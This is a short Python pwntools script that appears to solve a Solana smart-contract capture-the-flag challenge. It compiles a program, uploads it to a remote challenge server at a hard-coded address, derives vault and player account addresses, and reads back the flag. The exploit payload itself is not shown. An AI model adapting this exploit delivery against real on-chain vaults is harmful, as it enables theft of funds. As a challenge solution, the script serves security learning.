import os
os.system('cargo build-sbf')

from pwn import *
from solders.pubkey import Pubkey as PublicKey
from solders.system_program import ID
import base58

# context.log_level = 'debug'

host = args.HOST or "161.97.155.116"
port = args.PORT or 6972

r = remote(host, port)
solve = open('target/deploy/token_solve.so', 'rb').read()
r.recvuntil(b'program pubkey: ')
r.sendline(b'5PjDJaGfSPJj4tFzMRCiuuAasKg5n8dJKXKenhuwZexx')
r.recvuntil(b'program len: ')
r.sendline(str(len(solve)).encode())
r.send(solve)

r.recvuntil(b'program: ')
program = PublicKey(base58.b58decode(r.recvline().strip().decode()))
r.recvuntil(b'user: ')
user = PublicKey(base58.b58decode(r.recvline().strip().decode()))
vault, vault_bump = PublicKey.find_program_address([b'vault'], program)
player, player_bump = PublicKey.find_program_address([b'vault', bytes(user)], program)

r.sendline(b'4')
print("PROGRAM=", program)
r.sendline(b'x ' + str(program).encode())
print("USER=", user)
r.sendline(b'ws ' + str(user).encode())
print("VAULT=", vault)
r.sendline(b'w ' + str(vault).encode())
print("WALLET=", player)
r.sendline(b'w ' + str(player).encode())
r.sendline(b'0')

leak = r.recvuntil(b'Flag: ')
print(leak)
r.stream()
